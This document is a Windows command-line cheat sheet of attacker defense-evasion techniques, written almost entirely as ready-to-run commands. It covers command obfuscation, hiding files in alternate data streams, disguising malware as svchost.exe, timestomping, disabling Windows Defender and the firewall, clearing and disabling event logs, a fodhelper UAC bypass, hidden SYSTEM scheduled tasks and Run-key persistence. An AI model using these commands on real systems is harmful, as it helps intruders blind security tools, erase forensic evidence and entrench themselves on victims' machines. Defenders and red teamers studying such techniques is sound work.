# Obfuscating Commands

#### Base64 Encoding CMD Commands
- Use PowerShell to base64 encode CMD commands:
```cmd
powershell -NoProfile -Command "[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('whoami'))"
```
- Decode and execute:
```cmd
powershell.exe -EncodedCommand <Base64String>
```

#### Command Obfuscation Using Carets
- Use carets (`^`) to break commands into smaller parts:
```cmd
who^a^mi
```

#### Using Double Quotes for Obfuscation
- Use double quotes in commands to bypass filters:
```cmd
"whoami"
```

# Hiding Files and Directories

#### Creating Hidden Files and Directories
- Create a hidden directory:
```cmd
mkdir C:\Windows\Temp\hidden_dir
attrib +h C:\Windows\Temp\hidden_dir
```
- Create a hidden file:
```cmd
echo Malicious Content > C:\Windows\Temp\hidden_file.txt
attrib +h C:\Windows\Temp\hidden_file.txt
```

#### Renaming Malicious Files to Legitimate Names
- Rename a malicious file to look legitimate:
```cmd
rename C:\Temp\malicious.exe svchost.exe
```

#### Hiding Files Using Alternate Data Streams (ADS)
- Attach data to a file using ADS:
```cmd
echo Malicious Code > C:\Windows\System32\notepad.exe:hidden.txt
```
- Access the hidden stream:
```cmd
more < C:\Windows\System32\notepad.exe:hidden.txt
```

# Modifying File Timestamps (Timestomping)

#### Change File Creation Time
- Modify the file creation time using `wmic`:
```cmd
wmic datafile where name="C:\\path\\to\\file.txt" set CreationDate="20220915123456.000000+000"
```

# Process and Task Hiding

#### Starting a Process with Hidden Window
- Start a CMD process with a hidden window:
```cmd
start /min cmd.exe /c <command>
```

#### Tasklist Obfuscation
- Rename a process by copying to another legitimate-looking process name:
```cmd
copy C:\Temp\malicious.exe C:\Windows\System32\svchost.exe
```

# Disabling Security Tools

#### Disable Windows Defender
- Disable Windows Defender real-time protection:
```cmd
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
```

#### Add Exclusions to Windows Defender
- Add an exclusion path:
```cmd
powershell -command "Add-MpPreference -ExclusionPath 'C:\MaliciousPath'"
```
- Add a process exclusion:
```cmd
powershell -command "Add-MpPreference -ExclusionProcess 'malicious.exe'"
```

#### Disable Windows Firewall
- Disable the firewall for all profiles:
```cmd
netsh advfirewall set allprofiles state off
```

# Clearing and Disabling Event Logs

#### Clearing Event Logs
- Clear system log:
```cmd
wevtutil cl System
```
- Clear security log:
```cmd
wevtutil cl Security
```

#### Disabling Event Logs
- Disable specific event providers:
```cmd
wevtutil sl Microsoft-Windows-Security-Auditing /e:false
```

#### Disable Windows Event Log Service
- Stop the event log service:
```cmd
net stop eventlog
```

# Bypassing User Account Control (UAC)

#### UAC Bypass Using Event Viewer
- Bypass UAC by running Event Viewer as a high-privilege process:
```cmd
eventvwr.msc
```

#### UAC Bypass Using Fodhelper
- Modify the registry to execute PowerShell:
```cmd
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "cmd.exe /c <command>" /f
start fodhelper.exe
```

# Manipulating Scheduled Tasks

#### Create a Hidden Scheduled Task
- Create a scheduled task with no user interface:
```cmd
schtasks /create /tn "HiddenTask" /tr "cmd.exe /c <command>" /sc onstart /ru SYSTEM /f /it /np
```

#### Disabling Task Logs
- Create a scheduled task that suppresses output:
```cmd
schtasks /create /tn "NoLogTask" /tr "cmd.exe /c <command> > NUL 2>&1" /sc onstart /ru SYSTEM
```

# Obfuscating and Manipulating the Registry

#### Hiding a Malicious Program in the Registry
- Create a registry key to run a malicious program at startup:
```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Path\to\malicious.exe" /f
```

#### Deleting Evidence from the Registry
- Delete the malicious registry entry:
```cmd
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /f
```

# Network Evasion Techniques

#### Flushing DNS Cache
- Clear the DNS cache to remove evidence of DNS queries:
```cmd
ipconfig /flushdns
```

#### Disable Network Adapter Temporarily
- Disable a network adapter to evade detection:
```cmd
netsh interface set interface "Ethernet" admin=disable
```
- Re-enable the network adapter:
```cmd
netsh interface set interface "Ethernet" admin=enable
```

#### Modify Hosts File for Redirection
- Redirect traffic by modifying the hosts file:
```cmd
echo 127.0.0.1 malicious-site.com >> C:\Windows\System32\drivers\etc\hosts
```
